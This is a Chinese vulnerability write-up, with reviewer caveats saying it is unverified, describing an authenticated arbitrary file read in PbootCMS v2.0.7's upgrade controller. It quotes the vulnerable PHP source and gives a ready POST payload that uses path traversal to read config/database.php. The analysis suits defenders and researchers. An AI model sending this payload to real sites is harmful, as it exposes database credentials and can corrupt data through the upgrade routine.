---
source: "hatch 补库批 20260928"
product: "PbootCMS2.0.7"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PbootCMS v2.0.7 任意文件读取"
prerequisites: "来源所述条件，未列明部分仍待核：后台升级权限；SQLite报错回显；Windows或Linux已有script路径段；目标可读"
side_effects: "未执行；本文需注意的操作影响：执行升级会备份DB/可能执行读到的SQL及清缓存等副作用；后台SQLite任意SQL没用是无依据风险弱化"
source_status: "unknown"
id: "vw-301f5ccdf98aaa9a4dc878c1"
entity_id: "ve-301f5ccdf98aaa9a4dc878c1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台升级权限；SQLite报错回显；Windows或Linux已有script路径段；目标可读

- **适用与权限边界（1）**：标题漏后台；正文开头仅限Windows后又允许Linux已存在script路径，应写条件而非绝对OS禁用。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：读取内容先按分号拆分并执行，报错只泄露失败SQL片段，不能保证完整任意文件下载。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（3）**：执行升级会备份DB/可能执行读到的SQL及清缓存等副作用；后台SQLite任意SQL没用是无依据风险弱化。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（4）**：源码支持数据流，需补完整认证与错误文本。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PbootCMS v2.0.7 任意文件读取

一、漏洞简介
------------

仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录

二、漏洞影响
------------

PbootCMS v2.0.7

三、复现过程
------------

### 漏洞分析

漏洞文件`apps/admin/controller/system/UpgradeController.php`

    <?php
        ...
        public function update(){
            if ($_POST) {
                if (! ! $list = post('list')) {
                    $list = explode(',', $list);
                    $backdir = date('YmdHis');

                    // 分离文件
                    foreach ($list as $value) {
                        if (stripos($value, '/script/') !== false) {
                            $sqls[] = $value;
                        } else {
                            $path = RUN_PATH . '/upgrade' . $value;
                            $des_path = ROOT_PATH . $value;
                            $back_path = DOC_PATH . STATIC_DIR . '/backup/upgrade/' . $backdir . $value;
                            if (! check_dir(dirname($des_path), true)) {
                                json(0, '目录写入权限不足，无法正常升级！' . dirname($des_path));
                            }
                            if (file_exists($des_path)) { // 文件存在时执行备份
                                check_dir(dirname($back_path), true);
                                copy($des_path, $back_path);
                            }

                            // 如果后台入口文件修改过名字，则自动适配
                            if (stripos($path, 'admin.php') !== false && stripos($_SERVER['SCRIPT_FILENAME'], 'admin.php') === false) {
                                if (file_exists($_SERVER['SCRIPT_FILENAME'])) {
                                    $des_path = $_SERVER['SCRIPT_FILENAME'];
                                }
                            }

                            $files[] = array(
                                'sfile' => $path,
                                'dfile' => $des_path
                            );
                        }
                    }

                    // 更新数据库
                    if (isset($sqls)) {
                        $db = new DatabaseController();
                        switch (get_db_type()) {
                            case 'sqlite':
                                copy(DOC_PATH . $this->config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this->config('database.dbname')));
                                break;
                            case 'mysql':
                                $db->backupDB();
                                break;
                        }
                        sort($sqls); // 排序
                        foreach ($sqls as $value) {
                            $path = RUN_PATH . '/upgrade' . $value;
                            if (file_exists($path)) {
                                //echo $path;
                                //exit;
                                $sql = file_get_contents($path);
                                if (! $this->upsql($sql)) {
                                    $this->log("数据库 $value 更新失败!");
                                    json(0, "数据库" . basename($value) . " 更新失败！");
                                }
                            } else {
                                json(0, "数据库文件" . basename($value) . "不存在！");
                            }
                        }
                    }

                    // 替换文件
                    if (isset($files)) {
                        foreach ($files as $value) {
                            if (! copy($value['sfile'], $value['dfile'])) {
                                $this->log("文件 " . $value['dfile'] . " 更新失败!");
                                json(0, "文件 " . basename($value['dfile']) . " 更新失败，请重试!");
                            }
                        }
                    }

                    // 清理缓存
                    path_delete(RUN_PATH . '/upgrade', true);
                    path_delete(RUN_PATH . '/cache');
                    path_delete(RUN_PATH . '/complite');
                    path_delete(RUN_PATH . '/config');

                    $this->log("系统更新成功!");
                    json(1, '系统更新成功！');
                } else {
                    json(0, '请选择要更新的文件！');
                }
            }
        }
        ...
    ?>

可以看到注释写着更新数据库的部分，将`$sqls`遍历出来后放进了`file_get_contents`函数，然后调用了一个`upsql()`方法。跟过去看一下。

    <?php
        // 执行更新数据库
        private function upsql($sql){
            $sql = explode(';', $sql);
            $model = new Model();
            foreach ($sql as $value) {
                $value = trim($value);
                if ($value) {
                    $model->amd($value);
                }
            }
            return true;
        }
    ?>

将传过来的字符串用`;`分隔后又调用了一个`Model::amd()`方法。继续跟下去。

文件`core/database/Sqlite.php`

    <?php
        ...
        // 数据增、删、改模型，接受完整SQL语句，返回影响的行数的int数据
        public function amd($sql){
            $result = $this->query($sql, 'master');
            if ($result) {
                return $result;
            } else {
                return 0;
            }
        }
        // 执行SQL语句,接受完整SQL语句，返回结果集对象
        public function query($sql, $type = 'master'){
            ...
            switch ($type) {
                case 'master':
                    if (! $this->begin) { // 存在写入时自动开启显式事务，提高写入性能
                        $this->master->exec('begin;');
                        $this->begin = true;
                    }
                    $result = $this->master->exec($sql) or $this->error($sql, 'master');
                    break;
                case 'slave':
                    $result = $this->slave->query($sql) or $this->error($sql, 'slave');
                    break;
            }
            return $result;
        }
        // 显示执行错误
        protected function error($sql, $conn){
            $err = '错误：' . $this->$conn->lastErrorMsg() . '，';
            if ($this->begin) { // 存在显式开启事务时进行回滚
                $this->master->exec('rollback;');
                $this->begin = false;
            }
            error('执行SQL发生错误！' . $err . '语句：' . $sql);
        }
        ...
    ?>

这里的`amd()`方法又调用了一个`query()`方法，在`query()`方法里可以看到直接将`$sql`放进SQL执行函数里，如果执行失败，直接将`$sql`打印出来。

这样看下来这里的漏洞可以拿来执行任意SQL语句，但是由于这里用的是`sqlite`数据库，且当前已经在后台里了，所以这里的任意SQL执行也没啥可以利用的。**（可能可以审一下用数据库里的数据当做输入的点，没准能利用起来）**

但是由于正常的文件内容读出来直接当做SQL语句执行肯定会报错，所以这里可以用来读取文件。

经过回溯可以发现`$sqls`，使用的POST传输过来的数据，且数据中需要有`/script/`字符串。

### payload

    URL: http://www.0-sec.org/admin.php?p=/Upgrade/update
    POST: list=/script/../../../config/database.php

即可读取到文件\*\*（仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录）\*\*

参考链接
--------

> https://xz.aliyun.com/t/7628
